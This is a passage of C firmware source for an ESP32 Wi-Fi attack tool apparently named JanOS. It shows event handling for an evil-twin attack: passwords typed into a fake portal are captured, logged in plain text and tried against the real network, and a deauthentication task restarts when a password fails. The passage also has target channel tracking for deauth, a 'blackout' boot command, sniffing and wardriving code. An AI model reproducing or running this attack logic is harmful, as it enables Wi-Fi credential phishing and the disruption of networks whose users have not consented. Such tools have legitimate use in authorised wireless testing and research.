                           target_channel, g_scan_results[idx].ssid);
                esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
            }
            
            // Wait a bit for DHCP to assign IP
            vTaskDelay(pdMS_TO_TICKS(3000));
            break;
        }
        case WIFI_EVENT_AP_STADISCONNECTED: {
            const wifi_event_ap_stadisconnected_t *e = (const wifi_event_ap_stadisconnected_t *)event_data;
            MY_LOG_INFO(TAG, "AP: Client disconnected - MAC: %02X:%02X:%02X:%02X:%02X:%02X, AID: %u, reason: %u",
                        e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5], e->aid, e->reason);
            
            // Decrement connected clients counter
            if (portal_connected_clients > 0) {
                portal_connected_clients--;
            }            
            // If last client disconnected during evil twin attack, resume channel hopping
            if (portal_connected_clients == 0 && 
                (applicationState == DEAUTH_EVIL_TWIN || applicationState == EVIL_TWIN_PASS_CHECK)) {
                MY_LOG_INFO(TAG, "Last client disconnected - resuming channel hopping for deauth");
            }
            break;
        }
        case WIFI_EVENT_SCAN_DONE: {
            const wifi_event_sta_scan_done_t *e = (const wifi_event_sta_scan_done_t *)event_data;
            bool suppress_scan_logs = periodic_rescan_in_progress || wardrive_active || channel_view_scan_mode;

            if (!suppress_scan_logs) {
                MY_LOG_INFO(TAG, "WiFi scan completed. Found %u networks, status: %" PRIu32, e->number, e->status);
            }

            g_last_scan_status = e->status;
            if (e->status == 0) { // Success
                g_scan_count = MAX_AP_CNT;
                esp_wifi_scan_get_ap_records(&g_scan_count, g_scan_results);
                
                if (!suppress_scan_logs) {
                    if (g_scan_start_time_us > 0) {
                        int64_t elapsed_us = esp_timer_get_time() - g_scan_start_time_us;
                        float elapsed_s = elapsed_us / 1000000.0f;
                        MY_LOG_INFO(TAG, "Retrieved %u network records in %.1fs", g_scan_count, elapsed_s);
                    } else {
                        MY_LOG_INFO(TAG, "Retrieved %u network records", g_scan_count);
                    }
                    
                    // Automatically display scan results after completion
                    if (g_scan_count > 0 && !sniffer_active) {
                        print_scan_results();
                    }
                }
            } else {
                if (!suppress_scan_logs) {
                    MY_LOG_INFO(TAG, "Scan failed with status: %" PRIu32, e->status);
                }
                g_scan_count = 0;
            }
            
            g_scan_done = true;
            g_scan_in_progress = false;
            
            // Only reset applicationState to IDLE if not in active attack mode
            if (applicationState != DEAUTH && applicationState != DEAUTH_EVIL_TWIN && applicationState != EVIL_TWIN_PASS_CHECK) {
                applicationState = IDLE;
            }
            
            // Handle sniffer transition from scan to promiscuous mode
            if (sniffer_active && sniffer_scan_phase) {
                sniffer_process_scan_results();
                sniffer_scan_phase = false;
                
                // Set promiscuous filter (like Marauder)
                esp_wifi_set_promiscuous_filter(&sniffer_filter);
                
                // Enable promiscuous mode
                esp_wifi_set_promiscuous_rx_cb(sniffer_promiscuous_callback);
                esp_wifi_set_promiscuous(true);
                
                // Initialize dual-band channel hopping
                sniffer_channel_index = 0;
                sniffer_current_channel = dual_band_channels[sniffer_channel_index];
                sniffer_last_channel_hop = esp_timer_get_time() / 1000;
                esp_wifi_set_channel(sniffer_current_channel, WIFI_SECOND_CHAN_NONE);
                
                // Start channel hopping task for time-based hopping
                if (sniffer_channel_task_handle == NULL) {
                    xTaskCreate(sniffer_channel_task, "sniffer_channel", 2048, NULL, 5, &sniffer_channel_task_handle);
                    MY_LOG_INFO(TAG, "Started sniffer channel hopping task");
                }
                
                // Change LED to green for active sniffing
                esp_err_t led_err = led_set_color(0, 255, 0); // Green
                if (led_err != ESP_OK) {
                    ESP_LOGW(TAG, "Failed to set sniffer LED: %s", esp_err_to_name(led_err));
                }
                
                MY_LOG_INFO(TAG, "Sniffer: Scan complete, now monitoring client traffic with dual-band channel hopping (2.4GHz + 5GHz)...");
            } else if (!wardrive_active) {
                // Return LED to idle when normal scan is complete
                esp_err_t led_err = led_set_idle();
                if (led_err != ESP_OK) {
                    ESP_LOGW(TAG, "Failed to restore idle LED after scan: %s", esp_err_to_name(led_err));
                }
            }
            break;
        }
        case WIFI_EVENT_STA_DISCONNECTED: {
            const wifi_event_sta_disconnected_t *e = (const wifi_event_sta_disconnected_t *)event_data;
            ESP_LOGW(TAG, "Wi-Fi: connection to AP failed. SSID='%s', reason=%d",
                     (const char*)e->ssid, (int)e->reason);
            if (applicationState == EVIL_TWIN_PASS_CHECK) {
                ESP_LOGW(TAG, "Evil twin: connection failed, wrong password? Btw connectAttemptCount: %d", connectAttemptCount);
                if (connectAttemptCount >= 3) {
                    ESP_LOGW(TAG, "Evil twin: Too many failed attempts, giving up and going to DEAUTH_EVIL_TWIN. Btw connectAttemptCount: %d ", connectAttemptCount);
                    applicationState = DEAUTH_EVIL_TWIN; //go back to deauth
                    
                    // Mark password as wrong for portal feedback
                    last_password_wrong = true;
                    
                    // Resume deauth attack since password was wrong
                    if (!deauth_attack_active && deauth_attack_task_handle == NULL) {
                        MY_LOG_INFO(TAG, "Resuming deauth attack - password was incorrect.");
                        
                        // Set LED to red for deauth
                        esp_err_t led_err = led_set_color(255, 0, 0);
                        if (led_err != ESP_OK) {
                            ESP_LOGW(TAG, "Failed to set LED for deauth resume: %s", esp_err_to_name(led_err));
                        }
                        
                        // Start deauth attack in background task
                        deauth_attack_active = true;
                        BaseType_t result = xTaskCreate(
                            deauth_attack_task,
                            "deauth_task",
                            4096,  // Stack size
                            NULL,
                            5,     // Priority
                            &deauth_attack_task_handle
                        );
                        
                        if (result != pdPASS) {
                            MY_LOG_INFO(TAG, "Failed to create deauth attack task!");
                            deauth_attack_active = false;
                        } else {
                            MY_LOG_INFO(TAG, "Deauth attack resumed successfully.");
                        }
                    }
                } else {
                    ESP_LOGW(TAG, "Evil twin: This is just a disconnect, connectAttemptCount: %d, will try again", connectAttemptCount);
                    connectAttemptCount++;
                    esp_wifi_connect();
                }
            } else {
                ESP_LOGW(TAG, "Set app state to IDLE");
                applicationState = IDLE;
            }
            break;
        }
        default:
            break;
        }
    }
}

// --- Password verification function (used by portal) ---
static void verify_password(const char* password) {
    evilTwinPassword = malloc(strlen(password) + 1);
    if (evilTwinPassword != NULL) {
        strcpy(evilTwinPassword, password);
    } else {
        ESP_LOGW(TAG,"Malloc error for password");
    }

    MY_LOG_INFO(TAG, "Password received: %s", password);

    // Stop deauth attack BEFORE attempting to connect
    // This is crucial because deauth task switches channels which prevents stable STA connection
    if (deauth_attack_active || deauth_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping deauth attack to attempt connection...");
        deauth_attack_active = false;
        
        // Wait a bit for task to finish
        for (int i = 0; i < 20 && deauth_attack_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (deauth_attack_task_handle != NULL) {
            vTaskDelete(deauth_attack_task_handle);
            deauth_attack_task_handle = NULL;
            MY_LOG_INFO(TAG, "Deauth attack task forcefully stopped.");
        }
        
        // Restore LED to idle
        esp_err_t led_err = led_set_idle();
        if (led_err != ESP_OK) {
            ESP_LOGW(TAG, "Failed to restore idle LED after stopping deauth: %s", esp_err_to_name(led_err));
        }
        
        MY_LOG_INFO(TAG, "Deauth attack stopped.");
    }

    //Now, let's check if it's a password for Evil Twin:
    applicationState = EVIL_TWIN_PASS_CHECK;

    //set up STA properties and try to connect to a network:
    wifi_config_t sta_config = { 0 };  
    strncpy((char *)sta_config.sta.ssid, evilTwinSSID, sizeof(sta_config.sta.ssid));
    sta_config.sta.ssid[sizeof(sta_config.sta.ssid) - 1] = '\0'; // null-terminate
    strncpy((char *)sta_config.sta.password, password, sizeof(sta_config.sta.password));
    sta_config.sta.password[sizeof(sta_config.sta.password) - 1] = '\0'; // null-terminate
    esp_wifi_set_config(WIFI_IF_STA, &sta_config);
    vTaskDelay(pdMS_TO_TICKS(500));
    MY_LOG_INFO(TAG, "Attempting to connect to SSID='%s' with password='%s'", evilTwinSSID, password);
    connectAttemptCount = 0;
    MY_LOG_INFO(TAG, "Attempting to connect, connectAttemptCount=%d", connectAttemptCount);
    esp_wifi_connect();
}

// --- Wi-Fi initialization (STA, no connection yet) ---
static esp_err_t wifi_init_ap_sta(void) {
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    esp_netif_create_default_wifi_ap();
    esp_netif_create_default_wifi_sta();
    

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT,
                                                        ESP_EVENT_ANY_ID,
                                                        &wifi_event_handler,
                                                        NULL,
                                                        NULL));

    wifi_config_t wifi_config = { 0 };
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_config));

    wifi_config_t mgmt_wifi_config = {
            .ap = {
                .ssid = "",
                .ssid_len = 0,
                .ssid_hidden = 1,
                .password = "nevermind",
                .max_connection = 0,
                .authmode = WIFI_AUTH_WPA2_PSK
            },
        };

    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &mgmt_wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    uint8_t mac[6];
    esp_err_t ret = esp_wifi_get_mac(WIFI_IF_STA, mac);

    if (ret == ESP_OK) {
        MY_LOG_INFO(TAG,"JanOS version: " JANOS_VERSION);
        MY_LOG_INFO("MAC", "MAC Address: %02X:%02X:%02X:%02X:%02X:%02X",
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    } else {
        ESP_LOGE("MAC", "Failed to get MAC address");
    }

    return ESP_OK;
}


// --- Start background scan ---
static esp_err_t start_background_scan(void) {
    if (wardrive_active || wardrive_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Cannot start background scan: wardrive is active. Use 'stop' first.");
        return ESP_ERR_INVALID_STATE;
    }

    if (g_scan_in_progress) {
        MY_LOG_INFO(TAG, "Scan already in progress");
        return ESP_ERR_INVALID_STATE;
    }
    
    wifi_scan_config_t scan_cfg = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = true,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time.active.min = g_scan_min_channel_time,
        .scan_time.active.max = g_scan_max_channel_time,
    };
    
    g_scan_in_progress = true;
    g_scan_done = false;
    g_scan_count = 0;
    
    MY_LOG_INFO(TAG, "Starting background WiFi scan...");
    esp_err_t ret = esp_wifi_scan_start(&scan_cfg, false); // nieblokujace
    
    if (ret != ESP_OK) {
        g_scan_in_progress = false;
        MY_LOG_INFO(TAG, "Failed to start scan: %s", esp_err_to_name(ret));
        return ret;
    }
    
    return ESP_OK;
}

// Save target BSSIDs for channel monitoring
static void save_target_bssids(void) {
    target_bssid_count = 0;
    
    for (int i = 0; i < g_selected_count && target_bssid_count < MAX_TARGET_BSSIDS; ++i) {
        int idx = g_selected_indices[i];
        wifi_ap_record_t *ap = &g_scan_results[idx];
        
        target_bssids[target_bssid_count].channel = ap->primary;
        target_bssids[target_bssid_count].last_seen = esp_timer_get_time() / 1000;
        target_bssids[target_bssid_count].active = true;
        
        // Copy BSSID
        memcpy(target_bssids[target_bssid_count].bssid, ap->bssid, 6);
        
        // Copy SSID
        strncpy(target_bssids[target_bssid_count].ssid, (const char*)ap->ssid, 32);
        target_bssids[target_bssid_count].ssid[32] = '\0';
        
        target_bssid_count++;
    }
    
    // Debug: Print saved target BSSIDs
    for (int i = 0; i < target_bssid_count; ++i) {
        MY_LOG_INFO(TAG, "Target BSSID[%d]: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X, Channel: %d", 
                   i, target_bssids[i].ssid,
                   target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
                   target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5],
                   target_bssids[i].channel);
    }
}

// Static buffer for quick scan to avoid stack overflow (smaller buffer for channel monitoring)
#define QUICK_SCAN_MAX_APS 32
static wifi_ap_record_t quick_scan_results[QUICK_SCAN_MAX_APS];

// Quick channel scan for target BSSIDs
static esp_err_t quick_channel_scan(void) {
    if (!periodic_rescan_in_progress) {
        MY_LOG_INFO(TAG, "Starting quick channel scan for target BSSIDs...");
    }
    
    // Use the main scanning function instead of quick scan
    esp_err_t err = start_background_scan();
    if (err != ESP_OK) {
        if (!periodic_rescan_in_progress) {
            MY_LOG_INFO(TAG, "Quick scan failed: %s", esp_err_to_name(err));
        }
        return err;
    }
    
    // Wait for scan to complete
    int timeout = 0;
    while (g_scan_in_progress && timeout < 200) { // 20 seconds timeout
        vTaskDelay(pdMS_TO_TICKS(100));
        timeout++;
    }
    
    if (g_scan_in_progress) {
        if (!periodic_rescan_in_progress) {
            MY_LOG_INFO(TAG, "Quick scan timeout");
        }
        return ESP_ERR_TIMEOUT;
    }
    
    if (!g_scan_done || g_scan_count == 0) {
        if (!periodic_rescan_in_progress) {
            MY_LOG_INFO(TAG, "No scan results available");
        }
        return ESP_ERR_NOT_FOUND;
    }
    
    if (!periodic_rescan_in_progress) {
        MY_LOG_INFO(TAG, "Successfully retrieved %d scan records", g_scan_count);
    }
    
    // Copy scan results to our buffer
    uint16_t copy_count = (g_scan_count < QUICK_SCAN_MAX_APS) ? g_scan_count : QUICK_SCAN_MAX_APS;
    memcpy(quick_scan_results, g_scan_results, copy_count * sizeof(wifi_ap_record_t));
    
    // Update target channels based on scan results
    update_target_channels(quick_scan_results, copy_count);
    
    if (!periodic_rescan_in_progress) {
        MY_LOG_INFO(TAG, "Quick channel scan completed");
    }
    return ESP_OK;
}

// Update target channels based on latest scan results
static void update_target_channels(wifi_ap_record_t *scan_results, uint16_t scan_count) {
    bool channel_changed = false;
    
    if (!periodic_rescan_in_progress) {
        MY_LOG_INFO(TAG, "Updating target channels with %d scan results", scan_count);
        
        // Log current g_selected_indices and their corresponding BSSIDs
        MY_LOG_INFO(TAG, "Current g_selected_indices and BSSIDs:");
        for (int i = 0; i < g_selected_count; ++i) {
            int idx = g_selected_indices[i];
            MY_LOG_INFO(TAG, "  g_selected_indices[%d] = %d -> BSSID: %02X:%02X:%02X:%02X:%02X:%02X, SSID: %s", 
                       i, idx, g_scan_results[idx].bssid[0], g_scan_results[idx].bssid[1], g_scan_results[idx].bssid[2],
                       g_scan_results[idx].bssid[3], g_scan_results[idx].bssid[4], g_scan_results[idx].bssid[5],
                       g_scan_results[idx].ssid);
        }
        
        // Debug: Print all scan results
        for (int i = 0; i < scan_count; ++i) {
            MY_LOG_INFO(TAG, "Scan result[%d]: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X, Channel: %d", 
                       i, scan_results[i].ssid,
                       scan_results[i].bssid[0], scan_results[i].bssid[1], scan_results[i].bssid[2],
                       scan_results[i].bssid[3], scan_results[i].bssid[4], scan_results[i].bssid[5],
                       scan_results[i].primary);
        }
    }
    
    for (int i = 0; i < target_bssid_count; ++i) {
        if (!target_bssids[i].active) continue;
        
        if (!periodic_rescan_in_progress) {
            MY_LOG_INFO(TAG, "Checking target BSSID %s (current channel: %d)", 
                       target_bssids[i].ssid, target_bssids[i].channel);
        }
        
        // Find matching BSSID in scan results
        bool found = false;
        for (int j = 0; j < scan_count; ++j) {
            if (memcmp(target_bssids[i].bssid, scan_results[j].bssid, 6) == 0) {
                uint8_t old_channel = target_bssids[i].channel;
                target_bssids[i].channel = scan_results[j].primary;
                target_bssids[i].last_seen = esp_timer_get_time() / 1000;
                found = true;
                
                if (!periodic_rescan_in_progress) {
                    MY_LOG_INFO(TAG, "FOUND: Target BSSID %s (%02X:%02X:%02X:%02X:%02X:%02X) found in scan results at index %d, channel: %d", 
                               target_bssids[i].ssid, target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
                               target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5], j, scan_results[j].primary);
                }
                
                if (old_channel != target_bssids[i].channel) {
                    // ALWAYS log channel changes, even during periodic re-scan
                    MY_LOG_INFO(TAG, "Channel change detected for %s: %d -> %d", 
                               target_bssids[i].ssid, old_channel, target_bssids[i].channel);
                    channel_changed = true;
                }
                break;
            }
        }
        
        if (!found && !periodic_rescan_in_progress) {
            MY_LOG_INFO(TAG, "Target BSSID %s not found in scan results", target_bssids[i].ssid);
        }
    }
    
    if (channel_changed && !periodic_rescan_in_progress) {
        MY_LOG_INFO(TAG, "Channel changes detected, will resume deauth on new channels");
        MY_LOG_INFO(TAG, "Note: Using target_bssids[] directly for deauth attack to avoid index confusion");
    }
}

// Check if it's time for channel check
static bool check_channel_changes(void) {
    uint32_t current_time = esp_timer_get_time() / 1000; // Convert to milliseconds
    
    if (current_time - last_channel_check_time >= CHANNEL_CHECK_INTERVAL_MS) {
        last_channel_check_time = current_time;
        return true;
    }
    
    return false;
}

static void escape_csv_field(const char* input, char* output, size_t output_size) {
    if (!input || !output || output_size < 2) return;
    
    size_t input_len = strlen(input);
    size_t out_pos = 0;
    
    for (size_t i = 0; i < input_len && out_pos < output_size - 2; i++) {
        if (input[i] == '"') {
            if (out_pos < output_size - 3) {
                output[out_pos++] = '"';
                output[out_pos++] = '"';
            }
        } else {
            output[out_pos++] = input[i];
        }
    }
    output[out_pos] = '\0';
}

const char* authmode_to_string(wifi_auth_mode_t mode) {
    switch(mode) {
        case WIFI_AUTH_OPEN:
            return "Open";
        case WIFI_AUTH_WEP:
            return "WEP";
        case WIFI_AUTH_WPA_PSK:
            return "WPA";
        case WIFI_AUTH_WPA2_PSK:
            return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK:
            return "WPA/WPA2 Mixed";
        case WIFI_AUTH_WPA2_ENTERPRISE:
            return "WPA2 Enterprise";
        case WIFI_AUTH_WPA3_PSK:
            return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK:
            return "WPA2/WPA3 Mixed";
        case WIFI_AUTH_WAPI_PSK:
            return "WAPI";
        default:
            return "Unknown";
    }
}

static void vendor_persist_state(void) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(VENDOR_NVS_NAMESPACE, NVS_READWRITE, &handle);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Vendor NVS open failed: %s", esp_err_to_name(err));
        return;
    }

    uint8_t value = vendor_lookup_enabled ? 1 : 0;
    err = nvs_set_u8(handle, VENDOR_NVS_KEY_ENABLED, value);
    if (err == ESP_OK) {
        err = nvs_commit(handle);
    }
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Vendor NVS write failed: %s", esp_err_to_name(err));
    }
    nvs_close(handle);
}

static void vendor_load_state_from_nvs(void) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(VENDOR_NVS_NAMESPACE, NVS_READONLY, &handle);
    if (err == ESP_ERR_NVS_NOT_FOUND) {
        return;
    }
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Vendor NVS read open failed: %s", esp_err_to_name(err));
        return;
    }

    uint8_t value = vendor_lookup_enabled ? 1 : 0;
    err = nvs_get_u8(handle, VENDOR_NVS_KEY_ENABLED, &value);
    if (err == ESP_OK) {
        vendor_lookup_enabled = value != 0;
    } else if (err != ESP_ERR_NVS_NOT_FOUND) {
        ESP_LOGW(TAG, "Vendor NVS get failed: %s", esp_err_to_name(err));
    }
    nvs_close(handle);
}

static bool vendor_is_enabled(void) {
    return vendor_lookup_enabled;
}

static esp_err_t vendor_set_enabled(bool enabled) {
    vendor_lookup_enabled = enabled;
    vendor_last_valid = false;
    vendor_last_hit = false;
    vendor_lookup_buffer[0] = '\0';
    vendor_file_checked = false;
    vendor_file_present = false;
    vendor_record_count = 0;
    vendor_persist_state();
    return ESP_OK;
}

static bool boot_is_command_allowed(const char* command) {
    if (command == NULL || command[0] == '\0') {
        return false;
    }
    for (size_t i = 0; i < boot_allowed_command_count; i++) {
        if (strcasecmp(command, boot_allowed_commands[i]) == 0) {
            return true;
        }
    }
    return false;
}

static void boot_config_set_defaults(void) {
    memset(&boot_config, 0, sizeof(boot_config));
    boot_config.short_press.enabled = false;
    strlcpy(boot_config.short_press.command, "start_sniffer_dog", sizeof(boot_config.short_press.command));
    boot_config.long_press.enabled = false;
    strlcpy(boot_config.long_press.command, "start_blackout", sizeof(boot_config.long_press.command));
}

static void boot_config_persist(void) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(BOOTCFG_NVS_NAMESPACE, NVS_READWRITE, &handle);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Boot cfg save open failed: %s", esp_err_to_name(err));
        return;
    }

    esp_err_t write_err = nvs_set_u8(handle, BOOTCFG_KEY_SHORT_EN, boot_config.short_press.enabled ? 1U : 0U);
    if (write_err == ESP_OK) {
        write_err = nvs_set_u8(handle, BOOTCFG_KEY_LONG_EN, boot_config.long_press.enabled ? 1U : 0U);
    }
    if (write_err == ESP_OK) {
        write_err = nvs_set_str(handle, BOOTCFG_KEY_SHORT_CMD, boot_config.short_press.command);
    }
    if (write_err == ESP_OK) {
        write_err = nvs_set_str(handle, BOOTCFG_KEY_LONG_CMD, boot_config.long_press.command);
    }
    if (write_err == ESP_OK) {
        write_err = nvs_commit(handle);
    }

    nvs_close(handle);

    if (write_err != ESP_OK) {
        ESP_LOGW(TAG, "Boot cfg save failed: %s", esp_err_to_name(write_err));
    }
}

static void boot_config_load_from_nvs(void) {
    boot_config_set_defaults();

    nvs_handle_t handle;
    esp_err_t err = nvs_open(BOOTCFG_NVS_NAMESPACE, NVS_READONLY, &handle);
    if (err == ESP_ERR_NVS_NOT_FOUND) {
        return;
    }
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Boot cfg load open failed: %s", esp_err_to_name(err));
        return;
    }

    uint8_t value = 0;
    err = nvs_get_u8(handle, BOOTCFG_KEY_SHORT_EN, &value);
    if (err == ESP_OK) {
        boot_config.short_press.enabled = value != 0;
    }

    value = 0;
    err = nvs_get_u8(handle, BOOTCFG_KEY_LONG_EN, &value);
    if (err == ESP_OK) {
        boot_config.long_press.enabled = value != 0;
    }

    size_t required = 0;
    err = nvs_get_str(handle, BOOTCFG_KEY_SHORT_CMD, NULL, &required);
    if (err == ESP_OK && required > 0 && required <= BOOTCFG_CMD_MAX_LEN) {
        err = nvs_get_str(handle, BOOTCFG_KEY_SHORT_CMD, boot_config.short_press.command, &required);
        if (err != ESP_OK) {
            ESP_LOGW(TAG, "Boot cfg short cmd read failed: %s", esp_err_to_name(err));
        } else if (!boot_is_command_allowed(boot_config.short_press.command)) {
            ESP_LOGW(TAG, "Boot cfg short cmd not allowed (%s), resetting", boot_config.short_press.command);
            strlcpy(boot_config.short_press.command, "start_sniffer_dog", sizeof(boot_config.short_press.command));
        }
    }

    required = 0;
    err = nvs_get_str(handle, BOOTCFG_KEY_LONG_CMD, NULL, &required);
    if (err == ESP_OK && required > 0 && required <= BOOTCFG_CMD_MAX_LEN) {
        err = nvs_get_str(handle, BOOTCFG_KEY_LONG_CMD, boot_config.long_press.command, &required);
        if (err != ESP_OK) {
            ESP_LOGW(TAG, "Boot cfg long cmd read failed: %s", esp_err_to_name(err));
        } else if (!boot_is_command_allowed(boot_config.long_press.command)) {
            ESP_LOGW(TAG, "Boot cfg long cmd not allowed (%s), resetting", boot_config.long_press.command);
            strlcpy(boot_config.long_press.command, "start_blackout", sizeof(boot_config.long_press.command));
        }
    }

    nvs_close(handle);
}

static void boot_config_print(void) {
    MY_LOG_INFO(TAG, "boot_short_status=%s", boot_config.short_press.enabled ? "on" : "off");
    MY_LOG_INFO(TAG, "boot_short=%s", boot_config.short_press.command);
    MY_LOG_INFO(TAG, "boot_long_status=%s", boot_config.long_press.enabled ? "on" : "off");
    MY_LOG_INFO(TAG, "boot_long=%s", boot_config.long_press.command);
}

static void boot_list_allowed_commands(void) {
    MY_LOG_INFO(TAG, "Allowed boot commands:");
    for (size_t i = 0; i < boot_allowed_command_count; i++) {
        MY_LOG_INFO(TAG, "  %s", boot_allowed_commands[i]);
    }
}

static void boot_execute_command(const char* command) {
    if (command == NULL || command[0] == '\0') {
        return;
    }

    if (strcasecmp(command, "start_blackout") == 0) {
        (void)cmd_start_blackout(0, NULL);
    } else if (strcasecmp(command, "start_sniffer_dog") == 0) {
        (void)cmd_start_sniffer_dog(0, NULL);
    } else if (strcasecmp(command, "channel_view") == 0) {
        (void)cmd_channel_view(0, NULL);
    } else if (strcasecmp(command, "packet_monitor") == 0) {
        char arg0[] = "packet_monitor";
        char arg1[] = "1";
        char* argv[] = { arg0, arg1, NULL };
        (void)cmd_packet_monitor(2, argv);
    } else if (strcasecmp(command, "start_sniffer") == 0) {
        (void)cmd_start_sniffer(0, NULL);
    } else if (strcasecmp(command, "scan_networks") == 0) {
        (void)cmd_scan_networks(0, NULL);
    } else if (strcasecmp(command, "start_wardrive") == 0) {
        (void)cmd_start_wardrive(0, NULL);
    } else {
        MY_LOG_INFO(TAG, "Boot cmd '%s' not recognized", command);
    }
}

static void boot_handle_action(bool is_long_press) {
    const boot_action_config_t* action = is_long_press ? &boot_config.long_press : &boot_config.short_press;
    const char* label = is_long_press ? "long" : "short";
    if (!action->enabled) {
        MY_LOG_INFO(TAG, "Boot %s action disabled", label);
        return;
    }
    if (!boot_is_command_allowed(action->command)) {
        MY_LOG_INFO(TAG, "Boot %s command '%s' not allowed", label, action->command);
        return;
    }
    MY_LOG_INFO(TAG, "Boot %s executing: %s", label, action->command);
    boot_execute_command(action->command);
}

static void ensure_vendor_file_checked(void) {
    if (vendor_file_checked) {
        return;
    }
    if (!sd_card_mounted) {
        // SD card not ready yet, defer lookup until later
        vendor_file_checked = false;
        vendor_file_present = false;
        vendor_record_count = 0;
        return;
    }
    FILE *file = fopen(SD_OUI_BIN_PATH, "rb");
    if (file) {
        vendor_file_present = true;
        if (fseek(file, 0, SEEK_END) == 0) {
            long file_size = ftell(file);
            if (file_size >= (long)VENDOR_RECORD_SIZE) {
                vendor_record_count = (size_t)file_size / VENDOR_RECORD_SIZE;
            } else {
                vendor_record_count = 0;
            }
        } else {
            vendor_record_count = 0;
        }
        MY_LOG_INFO(TAG, "Vendor binary file detected (%u entries)", (unsigned int)vendor_record_count);
        fclose(file);
        if (vendor_record_count == 0) {
            vendor_file_present = false;
        }
    } else {
        vendor_file_present = false;
        vendor_record_count = 0;
        MY_LOG_INFO(TAG, "Vendor binary file not found");
    }
    vendor_file_checked = true;
    vendor_last_valid = false;
    vendor_last_hit = false;
    vendor_lookup_buffer[0] = '\0';
}

static const char* lookup_vendor_name(const uint8_t *bssid) {
    if (!vendor_lookup_enabled || !bssid) {
        vendor_last_valid = false;
        return NULL;
    }

    if (vendor_last_valid && memcmp(vendor_last_oui, bssid, 3) == 0) {
        return vendor_last_hit ? vendor_lookup_buffer : NULL;
    }

    ensure_vendor_file_checked();
    if (!vendor_file_present) {
        vendor_last_valid = false;
        return NULL;
    }

    FILE *file = fopen(SD_OUI_BIN_PATH, "rb");
    if (!file) {
        vendor_file_present = false;
        vendor_file_checked = false;
        vendor_last_valid = false;
        return NULL;
    }

    if (vendor_record_count == 0) {
        fclose(file);
        vendor_last_valid = false;
        return NULL;
    }

    size_t low = 0;
    size_t high = vendor_record_count;
    uint8_t record[VENDOR_RECORD_SIZE];
    bool found = false;
    while (low < high) {
        size_t mid = low + (high - low) / 2;
        long offset = (long)(mid * VENDOR_RECORD_SIZE);
        if (fseek(file, offset, SEEK_SET) != 0) {
            break;
        }
        if (fread(record, 1, VENDOR_RECORD_SIZE, file) != VENDOR_RECORD_SIZE) {
            break;
        }

        int cmp = memcmp(record, bssid, 3);
        if (cmp == 0) {
            uint8_t name_len = record[3];
            if (name_len > VENDOR_RECORD_NAME_BYTES) {
                name_len = VENDOR_RECORD_NAME_BYTES;
            }
            memcpy(vendor_lookup_buffer, &record[4], name_len);
            vendor_lookup_buffer[name_len] = '\0';
            memcpy(vendor_last_oui, bssid, 3);
            vendor_last_valid = true;
            vendor_last_hit = true;
            found = true;
            break;
        } else if (cmp < 0) {
            low = mid + 1;
        } else {
            high = mid;
        }
    }

    fclose(file);
    if (found) {
        return vendor_lookup_buffer;
    }

    memcpy(vendor_last_oui, bssid, 3);
    vendor_last_valid = true;
    vendor_last_hit = false;
    vendor_lookup_buffer[0] = '\0';
    return NULL;
}


static void print_network_csv(int index, const wifi_ap_record_t* ap) {
    char escaped_ssid[64];
    escape_csv_field((const char*)ap->ssid, escaped_ssid, sizeof(escaped_ssid));
    char escaped_vendor[64];
    const char *vendor_name = vendor_is_enabled() ? lookup_vendor_name(ap->bssid) : NULL;
    escape_csv_field(vendor_name ? vendor_name : "", escaped_vendor, sizeof(escaped_vendor));
    
    MY_LOG_INFO(TAG, "\"%d\",\"%s\",\"%s\",\"%02X:%02X:%02X:%02X:%02X:%02X\",\"%d\",\"%s\",\"%d\",\"%s\"",
                (index + 1),
                escaped_ssid,
                escaped_vendor,
                ap->bssid[0], ap->bssid[1], ap->bssid[2],
                ap->bssid[3], ap->bssid[4], ap->bssid[5],
                ap->primary,
                authmode_to_string(ap->authmode),
                ap->rssi,
                ap->primary <= 14 ? "2.4GHz" : "5GHz");
    vTaskDelay(pdMS_TO_TICKS(50));
}



static void print_scan_results(void) {
    //MY_LOG_INFO(TAG,"Index  RSSI  Auth  Channel  BSSID              SSID");
    for (int i = 0; i < g_scan_count; ++i) {
        wifi_ap_record_t *ap = &g_scan_results[i];
        // MY_LOG_INFO(TAG,"%5d  %4d  %4d  %5d  %02X:%02X:%02X:%02X:%02X:%02X  %s",
        //        i, ap->rssi, ap->authmode, ap->primary,
        //        ap->bssid[0], ap->bssid[1], ap->bssid[2],
        //        ap->bssid[3], ap->bssid[4], ap->bssid[5],
        //        (const char*)ap->ssid);
